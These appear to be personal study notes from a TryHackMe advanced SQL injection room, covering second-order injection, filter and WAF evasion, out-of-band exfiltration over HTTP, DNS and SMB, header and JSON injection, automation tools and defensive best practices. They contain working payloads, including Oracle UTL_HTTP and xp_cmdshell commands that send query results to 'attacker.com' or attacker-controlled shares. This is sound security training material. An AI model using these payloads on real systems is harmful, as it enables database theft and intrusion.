https://tryhackme.com/room/advancedsqlinjection

### Table of contents
- [[#Reminder]]
- [[#2nd-Order SQLi]]
- [[#Filter Evasion Techniques]]
- [[#Out-of-band SQLi]]: [[#Payloads -- Injection Queries for Different Databases]], [[#Exfiltration]]
- [[#Other Techniques]]
- [[#Automation]]
- [[#Best Practices]]

___
### Reminder
[[#Table of contents|Back to the top]]

[[11 SQL Injection|SQLi basics]]

***Reminder***
##### In-band SQLi
Same communication channel for injection and data retrieval
- **Error-based:** manipulate SQL query to produce error
- **Union-based:** combine results of 2+ SELECT statements to retrieve data
##### Inferential (Blind) SQLi
No direct transfer of data via webapp, send payload > observe app behavior - response time
- **Boolean-based:** send query, force app to return different result based on true/false condition, infer if condition was met or not based on page content/behavior
- **Time-based:** send query which delays response if true

**[[#Out-of-band SQLi]]**

___
### 2nd-Order SQLi
[[#Table of contents|Back to the top]]

AKA stored SQLi: user input saved, subsequently used in different part of app, possibly after being processed
Injection occurs when data is retrieved and used in SQL command

*Books review example*
SQLi doesn't get executed when adding the book, but when updating the book information

___
### Filter Evasion Techniques
[[#Table of contents|Back to the top]]

##### Character Encoding
- **URL Encoding:** characters encoded with "%" followed by ASCII hexadecimal value
*e.g. : `' OR 1=1--` --> `%27%20OR%201%3D1--`*
- **Hexadecimal Encoding:** replace characters with hexadecimal value
*e.g. : `SELECT * FROM users WHERE name = 'admin'` --> `SELECT * FROM users WHERE name = 0x61646d696e`*
- **Unicode Encoding:** unicode escape sequence
*e.g. : `admin` --> `\u0061\u0064\u006d\u0069\u006e`*

##### Preparing Payload
1. Make normal query to observe how input is implemented in SQL query
2. Add `'` to observe if error message --> if error, may mean it interprets special characters and there is a chance for SQLi
3. Add `' OR 1=1` --> if `OR` is filtered out, can be replaced with `||` + URL encoding
4. `+` after `--` adds a space after comment, ensures comment properly terminated, no syntax issue

##### No-Quote SQLi
Remove quotes, yep that's it
**CONCAT() Function:** `CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)` constructs string `'admin'` without using quotes

##### No Spaces Allowed
- **Comments to Replace Spaces:** replace space with `/**/`
*e.g. : `SELECT * FROM users WHERE name = 'admin'` --> `SELECT/**/*FROM/**/users/**/WHERE/**/name/**/='admin'`*
- **Tab / Newline Characters:** replace space with `\t` or `\n` 
- **Alternate Characters:** URL-encoded whitespaces -- `%09` (horizontal tab), `%0A` (line feed), `%0C` (form feed), `%0D` (carriage return), and `%A0` (non-breaking space)

| Banned                                            | Solution                                                                    | Example                                                                                                         |
| ------------------------------------------------- | --------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| **Keywords like SELECT**                          | Change case / add inline comments to break them up                          | `SElEcT * FrOm users`<br>or `SE/**/LECT * FROM/**/users`                                                        |
| **Spaces**                                        | Alternative whitespace characters / comments                                | `SELECT%0A*%0AFROM%0Ausers` <br>or `SELECT/**/*/**/FROM/**/users`                                               |
| **Logical operators like AND, OR**                | Alternative logical operators / concatenation                               | `username = 'admin' && password = 'password'` <br>or `username = 'admin'/**/\|/**/1=1 --`                       |
| **Common keywords like admin**                    | Equivalent representations (hexadecimal, Unicode encoding)                  | `SElEcT * FROM users WHERE username = CHAR(0x61,0x64,0x6D,0x69,0x6E)`                                           |
| **Specific keywords like OR, AND, SELECT, UNION** | Obfuscation techniques: combine characters with string functions / comments | `SElECT * FROM users WHERE username = CONCAT('a','d','m','i','n')` <br>or `SElEcT/**/username/**/FROM/**/users` |

___
### Out-of-band SQLi
[[#Table of contents|Back to the top]]

Cannot use same channel to launch attack and gather data / unstable server responses
Database server makes out-of-band requests (e.g. : HTTP, DNS, SMB) to send query result
Particularly stealthy and reliable: different communication channel --> avoid detection, maintain persistence

![[out-of-band-sqli.svg]]

**Why** use OOB
- **Sanitised** direct responses
- **IDS/WAF** monitor SQL queries, may block direct responses
--> use less scrutinised network protocols

##### Payloads -- Injection Queries for Different Databases
[[#Table of contents|Back to the top]]

**MySQL / MariaDB**
```SQL
SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
```
*`SELECT ... INTO OUTFILE` (or `load_file`) writes query result to file > access file via SMB/HTTP server running on database server*

**MSSQL -- Microsoft SQL**
```SQL
EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';
```
*`xp_cmdshell`: execute shell commands from SQL query, write data to network share accessible file*

**Oracle**
```SQL
DECLARE
    req UTL_HTTP.REQ;
    resp UTL_HTTP.RESP;
BEGIN
    req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
    UTL_HTTP.GET_RESPONSE(req); END;
```
*`UTL_HTTP`, `UTL_FILE` packages used to execute SQLi, `UTL_HTTP` used to send HTTP requests with sensitive data*

##### Exfiltration
[[#Table of contents|Back to the top]]

**HTTP**
Send data to attacker web server
MySQL, MariaDB don't support HTTP requests natively --> use external scripts / UDFs (User Defined Functions)
*e.g. : `SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;`*

**DNS**
Bypass HTTP-based monitoring, leverage database's ability to DNS lookup
MySQL doesn't support natively --> use UDFs / system-level scripts

**SMB**
Write query result to SMB share, particularly effective in Windows
*e.g. : `SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';`*
In Linux, use `smbclient`

##### Practical -- OOB SQLi with SMB share
Target URL: `http://10.64.153.148/oob/search_visitor.php?visitor_name=Tim`

1. Enable network share on `ATTACKER_IP\logs`
	1. `cd /opt/impacket/examples`
	2. `python3.9 smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp`: SMB server sharing `/tmp`
	3. `smbclient //ATTACKER_IP/logs -U guest -N`: access contents of share, then `ls`

*NB: this kind of attack may not be done if MySQL system variable `secure_file_priv` is correctly configured, it allows files to be written only in a specified directory*

2. Payload to be injected in `visitor_name` parameter
```SQL
1'; SELECT @@version INTO OUTFILE '\\\\ATTACKER_IP\\logs\\out.txt'; --
```

___
### Other Techniques
[[#Table of contents|Back to the top]]

##### HTTP Header Injection

Manipulate HTTP headers (like `User-Agent`, `Referer`, or `X-Forwarded-For`)
e.g. : `User-Agent: ' OR 1=1; --`
`User-Agent: ' UNION SELECT username, password FROM user; --`

**Payload Preparation**
1. Close string with "`'`"
2. Inject UNION SELECT: `UNION SELECT username, password FROM user;`
3. Comment out rest of query: `#`

`curl -H "User-Agent: ' UNION SELECT username, password FROM user; # " http://TARGET_IP/`

##### Stored Procedures
*Precompiled SQL statements that can be executed as a single unit*

![[stored_procedure.svg]]

Can accept parameters, if not properly sanitised --> vulnerable to SQLi

##### XML & JSON Injection
App parses XML and JSON data and uses parsed data in SQL queries
e.g. : 
```JSON
{
  "username": "admin' OR '1'='1--",
  "password": "password"
}
```

___
### Automation
[[#Table of contents|Back to the top]]

Challenges
- **Dynamic** nature of SQL queries: multiple layers of logic --> hardly automated
- **Injection Points:** multiple points --> input fields, HTTP headers, URL parameters
- **Security Measures:** prepared statements, parameterised queries, ORM frameworks
- **Context-Specific Detection:** context in which user input is used in SQL queries

Tools
- **[SQLMap](https://github.com/sqlmapproject/sqlmap):** open-source, SQLi detection and exploitation ([THM room](https://tryhackme.com/room/sqlmap))
- **[SQLNinja](https://github.com/xxgrunge/sqlninja):** SQLi exploitation in webapps that use Microsoft SQL Server
- **[JSQL Injection](https://github.com/ron190/jsql-injection):** Java, detection within Java apps
- **[BBQSQL](https://github.com/CiscoCXSecurity/bbqsql):** blind SQLi

___
### Best Practices
[[#Table of contents|Back to the top]]

*Coders*
- **Parameterised Queries & Prepared Statements:** ensure all user inputs treated as data rather than executable code, separate query structure from data
- **Input Validation & Sanitization:** input conform to expected format, validate types, lengths, ranges, reject non conform input
  --> `htmlspecialchars()`, `filter_var()` in PHP
- **Least Privilege:** minimum necessary database permissions, avoid using admin privileges
- **Stored Procedures:** encapsulate and validate SQL logic
- **Regular Security Audits & Code Reviews**

*Pentesters*
- **Database-Specific Features:** adapt to DBMS (Database Management System -- MySQL, PostgreSQL, Oracle, MSSQL)
  *e.g. : in MSSQL, `xp_cmdshell` can be used to execute system commands* 
- **Error Messages:** force errors to gain insights into database structure
  *e.g. : `1' AND 1=CONVERT(int, (SELECT @@version)) --`*
- **WAF & Filters:** obfuscation techniques -- mixed case, concatenation (`CONCAT()`), alternate encodings (hex, URL), inline comments (`/**/`)
- **Database Fingerprinting:** database type and version
  *e.g. : on PostgreSQL `SELECT version()`, on MySQL and MSSQL `SELECT @@version`*
- **Pivoting:** pivot and exploit other parts of network